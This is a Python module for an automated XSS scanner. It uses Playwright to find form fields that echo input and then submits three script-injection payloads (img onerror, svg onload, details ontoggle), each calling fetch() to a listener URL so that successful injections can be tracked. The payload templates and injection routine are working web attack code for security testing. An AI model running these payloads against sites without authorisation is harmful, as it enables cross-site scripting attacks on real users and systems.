"""Simplified XSS scanner that injects payloads into discovered forms."""

from __future__ import annotations

from typing import Any, Dict, List

from playwright.sync_api import Browser, Page

from ...callback.server import register_payload, tracker

PAYLOAD_TEMPLATES = (
    "<img src=x onerror=fetch('{url}')>",
    "<svg onload=fetch('{url}')>",
    "<details open ontoggle=fetch('{url}')>",
)
MARKER = "__owasp_scanner_echo__"


class XSSScanner:
    def __init__(self, page: Page, browser: Browser, listener_url: str, origin_url: str, playwright_instance: Any):
        self.page = page
        self.browser = browser
        self.listener_url = listener_url.rstrip("/")
        self.origin_url = origin_url
        self.playwright = playwright_instance
        self.successful_echo_fields: List[Dict[str, str]] = []
        self.injected_payloads: List[Dict[str, str]] = []

    def _apply_payload(self, field_name: str, payload_id: str, template_index: int) -> Dict[str, str]:
        payload = PAYLOAD_TEMPLATES[template_index].format(url=f"{self.listener_url}?id={payload_id}")
        locator = self.page.locator(f"[name='{field_name}']")
        if locator.count() == 0:
            return {}

        input_field = locator.first
        input_field.fill(payload)
        input_field.press("Enter")

        if payload_id in tracker.injected:
            tracker.injected[payload_id].payload = payload

        return {
            "field": field_name,
            "payload_id": payload_id,
            "payload": payload,
        }

    def _echo_test(self, url: str, field_name: str) -> bool:
        self.page.goto(url, timeout=10000)
        locator = self.page.locator(f"[name='{field_name}']")
        if locator.count() == 0:
            return False
        input_field = locator.first
        input_field.fill(MARKER)
        input_field.press("Enter")
        self.page.wait_for_timeout(1500)
        return MARKER in self.page.content()

    def run(self, form_targets: List[Dict[str, Any]]) -> List[Dict[str, str]]:
        for form in form_targets:
            url = form.get("url_de_envio")
            campos: List[str] = form.get("campos", [])
            if not url or not campos:
                continue
            for field in campos:
                if not field:
                    continue
                try:
                    if self._echo_test(url, field):
                        self.successful_echo_fields.append({"url": url, "field": field})
                except Exception:
                    continue

        if not self.successful_echo_fields:
            return []

        for item in self.successful_echo_fields:
            url = item["url"]
            field = item["field"]
            self.page.goto(url, timeout=10000)
            for index, _ in enumerate(PAYLOAD_TEMPLATES):
                payload_id = register_payload(None, field, "", url)
                try:
                    record = self._apply_payload(field, payload_id, index)
                    if record:
                        self.injected_payloads.append(record)
                    self.page.wait_for_timeout(1500)
                except Exception:
                    continue

        return self.injected_payloads
